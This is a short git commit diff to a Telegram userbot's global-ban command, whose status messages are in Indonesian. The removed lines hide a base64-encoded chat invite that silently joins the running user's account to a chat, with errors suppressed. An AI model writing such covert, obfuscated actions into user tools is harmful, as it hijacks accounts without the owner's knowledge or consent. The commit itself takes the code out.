f256ad556f4f14a61f418c155b9995fed5e8d855
Muhamad Risman Aziz <62795826+mrismanaziz@users.noreply.github.com>
2021-11-13 20:12:00 +0700

    Update globalban.py

--- userbot/modules/globalban.py
+++ userbot/modules/globalban.py
@@ -57,11 +57,6 @@ async def gban(event):
     if user.id in DEVS:
         await gbun.edit("**Gagal GBAN karena dia adalah Pembuat saya 🗿**")
         return
-    try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        await event.client(ImportChatInviteRequest(hmm))
-    except BaseException:
-        pass
     if gban_sql.is_gbanned(user.id):
         await gbun.edit(
             f"**Si** [Jamet](tg://user?id={user.id}) **ini sudah ada di daftar gbanned**"
